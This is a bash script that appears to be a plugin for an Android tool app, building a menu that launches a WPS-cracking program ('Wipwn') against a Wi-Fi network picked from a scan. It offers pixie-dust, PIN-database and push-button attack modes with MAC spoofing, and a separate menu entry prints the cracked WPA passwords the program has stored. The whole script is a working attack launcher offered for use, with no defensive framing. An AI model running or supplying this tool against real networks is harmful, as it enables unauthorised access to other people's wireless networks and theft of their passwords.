#!/data/data/com.tool.tree/files/home/bin/bash
# Kakathic

MPAT="${0%/*}"

if [ "$(cmd wifi status | grep -cm1 'Wifi is disabled')" == 1 ]; then
  cmd wifi set-wifi-enabled enabled
  sleep 1
fi

[ "$(glog wifi_tool_customize)" == 1 ] && number_wifi_pin=1

# Ngôn ngữ mặc định
eval "$(grep '="' "$MPAT/english.prop" | sed "/google_text=/d")"
[ -f "$MPAT/language.bash" ] && source "$MPAT/language.bash"

# Google dịch
if [ "$(glog "auto_trans_text_${MPAT##*/}")" == 1 ]; then
  trans_add "$MPAT"
  [ -f "$MPAT/auto.sh" ] && source "$MPAT/auto.sh"
fi

if [ "$1" == "home" ]; then
  xml_print '<?xml version="1.0" encoding="UTF-8" ?>
<page>

  <group title="'$google_text'">
    <text summary-sh="iw dev wlan0 link"/>
  </group>

  <group>
    <picker reload="true" options-sh="python '$MPAT'/scan_wifi.py">
      <title>'$wifi_text_1'</title>
      <desc>'$wifi_text_2'</desc>
      <set>
        if [ "$state" ]; then
          echo "'$wifi_text_3'..."
          echo
          [ -d $HOME/.Wipwn ] && rm -fr $HOME/.Wipwn
          [ -e /dev/wmtWifi ] && wifi_tool_mtk="--mtk-wifi"
          cd "$HOME/root"
          if [ "$(glog wifi_tool_customize)" == 1 ]; then
            python -u '$MPAT'/main.py -i wlan0 -b "$state" -B -w -p $(glog pin_number_wifi 00000000) --spoof-mac $wifi_tool_mtk | sed -u -e "s|WPA PSK:|WPA PSK (Password):|"
          elif [ "$(glog wifi_tool_customize)" == 2 ]; then
            python -u '$MPAT'/main.py -i wlan0 -b "$state" --pbc $wifi_tool_mtk | sed -u -e "s|WPA PSK:|WPA PSK (Password):|"
          else
            python -u '$MPAT'/main.py -i wlan0 -b "$state" -K --spoof-mac -d 3 -l 120 $wifi_tool_mtk | sed -u -e "s|WPA PSK:|WPA PSK (Password):|"
          fi
          echo
          checktime
        else
          echo "'$wifi_text_4'"
        fi
      </set>
    </picker>
  </group>

  <group>
    <action reload="true" shell="hidden">
      <title>'$STR_ADVANCED_CUSTOM'</title>
      <param name="wifi_tool_customize" value-sh="glog wifi_tool_customize 0" label="'$STR_OPTION'" desc="'$STR_ALL_ATTACK_METHODS'">
        <option value="0">'$STR_BASIC_ATTACK'</option>
        <option value="1">'$STR_PIN_DATABASE_ATTACK'</option>
        <option value="2">'$STR_WPS_PUSH_ATTACK'</option>
      </param>
      <set>slog wifi_tool_customize "$wifi_tool_customize"</set>
    </action>

    <action warn="'$STR_PIN_WARNING'" shell="hidden" visible="echo '$number_wifi_pin'">
      <title>'$STR_INPUT_PIN'</title>
      <summary sh="glog pin_number_wifi"/>
      <param name="pin_number_wifi" type="number" value-sh="glog pin_number_wifi" label="'$STR_PIN_CODE'" placeholder="12345670"/>
      <set>slog pin_number_wifi "$pin_number_wifi"</set>
    </action>
  </group>

  <group>
    <action reload="true">
      <title>'$wifi_text_5'</title>
      <set>
        if [ -f $HOME/root/store/wipwn_crack_data.txt ]; then
          cat $HOME/root/store/wipwn_crack_data.txt | sed "s|PSK:|PSK (Password):|g"
        else
          echo "'$wifi_text_6'"
        fi
      </set>
    </action>
  </group>

</page>'
fi